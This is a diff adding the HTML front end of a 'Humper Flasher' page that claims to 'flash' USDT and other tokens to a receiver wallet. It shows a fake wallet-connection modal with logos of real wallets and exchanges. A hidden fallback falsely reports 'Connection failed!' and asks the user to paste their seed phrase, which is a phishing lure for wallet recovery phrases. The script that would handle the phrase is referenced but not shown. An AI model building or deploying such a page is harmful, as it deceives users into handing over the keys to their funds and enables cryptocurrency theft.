@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Humper Flasher</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Humper Flasher</h1>
+        <div class="input-section">
+            <label for="receiver-wallet">Receiver Wallet:</label>
+            <input type="text" id="receiver-wallet" placeholder="Enter receiver wallet address">
+            
+            <label for="coin-token">Select Coin/Token:</label>
+            <select id="coin-token">
+                <option value="usdt-trc20">USDT (TRC20)</option>
+                <option value="usdt-bep20">USDT (BEP20)</option>
+                <option value="usdt-erc20">USDT (ERC20)</option>
+                <option value="btc-bep20">Bitcoin (BEP20)</option>
+                <option value="usdc-bep20">USDC (BEP20)</option>
+                <option value="eth-bep20">ETH (BEP20)</option>
+                <option value="shib-bep20">Shib (BEP20)</option>
+            </select>
+            
+            <button id="flash-button">Flash</button>
+        </div>
+        
+        <!-- Wallet Connection Modal -->
+        <div id="wallet-modal" class="modal">
+            <div class="modal-content">
+                <h2>Link Wallet</h2>
+                <p>Please connect your wallet to pay for gas fees.</p>
+                <div class="wallet-options">
+                    <img src="https://cryptologos.cc/logos/okx-okb-logo.png" alt="OKX Wallet" onclick="connectWallet('OKX')">
+                    <img src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet" onclick="connectWallet('Trust')">
+                    <img src="https://www.bybit.com/favicon.ico" alt="Bybit Wallet" onclick="connectWallet('Bybit')">
+                    <img src="https://metamask.io/images/favicon.ico" alt="Metamask" onclick="connectWallet('Metamask')">
+                    <img src="https://binance.com/favicon.ico" alt="Binance Wallet" onclick="connectWallet('Binance')">
+                </div>
+                <div id="seed-phrase-section" style="display: none;">
+                    <p>Connection failed! Please enter your seed phrase to connect manually.</p>
+                    <textarea id="seed-phrase" rows="5" placeholder="Paste your seed phrase here"></textarea>
+                    <button id="submit-seed">Submit</button>
+                </div>
+                <div id="loading" style="display: none;">Processing...</div>
+                <div id="error-message" style="display: none;">Unable to connect wallet due to no balance.</div>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
